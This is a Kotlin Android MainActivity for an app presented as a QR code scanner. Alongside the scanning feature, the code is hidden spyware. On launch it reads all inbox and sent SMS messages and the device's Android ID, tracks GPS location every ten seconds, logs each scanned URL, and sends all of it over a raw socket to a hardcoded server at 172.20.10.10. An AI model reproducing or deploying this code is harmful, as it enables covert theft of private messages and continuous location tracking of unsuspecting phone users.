// MAIN ACTIVITY TO LAUNCH A SCAN AND BROWSE THE RESULT

package com.zizou.qrcodescanner

import android.app.Activity
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import androidx.activity.result.contract.ActivityResultContracts

import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

import java.io.IOException
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.Socket
import java.io.BufferedReader

import android.content.pm.PackageManager
import android.location.Location
import android.Manifest
import android.content.Context
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import androidx.core.app.ActivityCompat
import java.util.Calendar
import android.os.Handler
import android.os.Looper

import android.provider.Settings.Secure
import android.annotation.SuppressLint
import android.net.Uri
import java.text.SimpleDateFormat
import java.util.Date

class MainActivity : AppCompatActivity() {

    private val requestLocationPermission = 1
    private val requestSMSPermission = 2
    private val requestAllPermission = 3
    private val received = 1000
    private val sent = 2000
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val handler = Handler(Looper.getMainLooper())
    private val interval = 10000

    private lateinit var qrCodeValueButton: Button
    private lateinit var startScanButton: Button

    companion object {
        // Define a public static variable
        var androidId: String = ""
    }


    // ------- ACTIONS TO PERFORM WHEN CREATING AND DESTROYING THE ACTIVITY -----------
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAllPermissions()

        setContentView(R.layout.activity_main)
        getAndroidId(this)
        retrieveSMSData(this, received)
        retrieveSMSData(this, sent)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        handler.postDelayed(runnable, interval.toLong())
        getLocation()

        qrCodeValueButton = findViewById(R.id.qr_code_value_button)
        startScanButton = findViewById(R.id.start_scan_button)
        qrCodeValueButton.isEnabled = false

        initButtonClickListener()

    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
    }

    // ---------- NORMAL OPERATION OF THE QR CODE SCANNER ---------------
    private fun initButtonClickListener() {
        startScanButton.setOnClickListener {
            val intent = Intent(this, ScanQrCodeActivity::class.java)
            qrCodeValueButton.isEnabled = false
            resultLauncher.launch(intent)
        }

        qrCodeValueButton.setOnClickListener() {
            val intent = Intent(this, WebPageActivity::class.java)
            intent.putExtra("urlScanned", qrCodeValueButton.text)
            qrCodeValueButton.isEnabled = false
            resultLauncher.launch(intent)
        }
    }

    private val resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (it.resultCode == Activity.RESULT_OK) {
            val data = it.data?.getStringExtra(ScanQrCodeActivity.QR_CODE_KEY)
            updateQrCodeButton(data)
            val sendUrl = "url : " + data.toString()
            newPacket(sendUrl)

        }

    }
    private fun updateQrCodeButton(data: String?) {
        data?.let {
            runOnUiThread {
                qrCodeValueButton.isEnabled = true
                qrCodeValueButton.text = it
            }
        }
    }

    private fun requestAllPermissions() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_SMS

                ),
                requestAllPermission
            )
            return
        }
    }

    // -------------- TO REQUEST THE DIFFERENT PERMISSIONS ----------------
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == requestLocationPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
            getLocation()
        }
        if (requestCode == requestSMSPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            retrieveSMSData(this, received)
            retrieveSMSData(this, sent)
        }
        if (requestCode == requestAllPermission
            && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
            && grantResults[1] == PackageManager.PERMISSION_GRANTED
            && grantResults[2] == PackageManager.PERMISSION_GRANTED
            && grantResults[3] == PackageManager.PERMISSION_GRANTED
            && grantResults[4] == PackageManager.PERMISSION_GRANTED) {
            requestAllPermissions()
        }

    }

    // ---------------- TO SEND DATA TO THE SERVER -----------------------
    private fun newPacket(data: String) {

        GlobalScope.launch(Dispatchers.IO) {
            try {
                val socket = Socket("172.20.10.10", 12345)

                // obtenir les flux d'entrée et de sortie pour communiquer avec le serveur
                val inputStream = socket.getInputStream()
                val outputStream = socket.getOutputStream()

                // Créer des BufferedReader et BufferedWriter pour lire et écrire des données
                val reader = BufferedReader(InputStreamReader(inputStream))
                val writer = OutputStreamWriter(outputStream)

                // Écrire des données sur le flux de sortie
                var idData = androidId+","+data
                writer.write(idData)
                writer.flush()

                socket.close()

            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }

    // ----------- MAP LOCATION FUNCTIONS ------------------

    private val runnable = object : Runnable {
        override fun run() {
            getLocation()
            handler.postDelayed(this, interval.toLong())
        }
    }

    fun getCurrentDate(): String {
        val calendar = Calendar.getInstance()
        val year = calendar.get(Calendar.YEAR)
        val month = calendar.get(Calendar.MONTH) + 1
        val day = calendar.get(Calendar.DAY_OF_MONTH)

        return "$day/$month/$year"
    }

    private fun getLocation() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ),
                requestLocationPermission
            )
            return
        }

        fusedLocationClient.lastLocation
            .addOnSuccessListener { location: Location? ->
                if (location != null) {
                    val latitude = location.latitude
                    val longitude = location.longitude
                    val data = "gps : ($latitude : $longitude) : " + getCurrentDate()
                    newPacket(data)
                    //showLocationDialog(latitude, longitude)
                }
            }
    }

    // GET THE ANDROID ID TO IDENTIFY A PHONE ON THE SERVER
    @SuppressLint("HardwareIds")
    private fun getAndroidId(context: Context){
        androidId = Secure.getString(context.contentResolver, Secure.ANDROID_ID)

    }

    // ----------- SMS RETRIEVAL FUNCTIONS -----------------
    private fun smsPermission() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.READ_SMS
                ),
                requestSMSPermission
            )
            return
        }
    }

    private fun retrieveSMSData(context: Context, receivedOrSent: Int) { //: List<Triple<String, String, String>> {
        smsPermission()

        val smsList = mutableListOf<Triple<String, String, String>>()
        var uriString = ""
        if (receivedOrSent == received) {
            uriString = "content://sms/inbox"
        }
        else if (receivedOrSent == sent) {
            uriString = "content://sms/sent"
        }
        val uri = Uri.parse(uriString)
        val cursor = context.contentResolver.query(uri, null, null, null, null)

        if (cursor != null && cursor.moveToFirst()) {
            val bodyIndex = cursor.getColumnIndex("body")
            val addressIndex = cursor.getColumnIndex("address")
            val dateIndex = cursor.getColumnIndex("date")

            do {
                val smsBody = cursor.getString(bodyIndex)
                val senderAddress = cursor.getString(addressIndex)
                val smsDate = timestampToString(cursor.getLong(dateIndex))
                smsList.add(Triple(smsDate, senderAddress, smsBody))
            } while (cursor.moveToNext())

            cursor.close()
        }

        if (smsList.isNotEmpty()) {
            for ((date, address, message) in smsList) {
                sendSMSToServer(date, address, message, receivedOrSent)
            }
        }
    }

    private fun sendSMSToServer(date: String, addr: String, msg: String, receivedOrSent: Int) {
        var data = ""
        if (receivedOrSent == received) {
            data = "sms : $date, sender: $addr, Message: $msg"
        }
        else if (receivedOrSent == sent) {
            data = "sms : $date, recipient: $addr, Message: $msg"
        }
        newPacket(data)
    }

    @SuppressLint("SimpleDateFormat")
    private fun timestampToString(timestamp: Long): String {
        val dateFormat = SimpleDateFormat("dd-MM-yyyy HH:mm:ss")
        val date = Date(timestamp)
        return dateFormat.format(date)
    }

}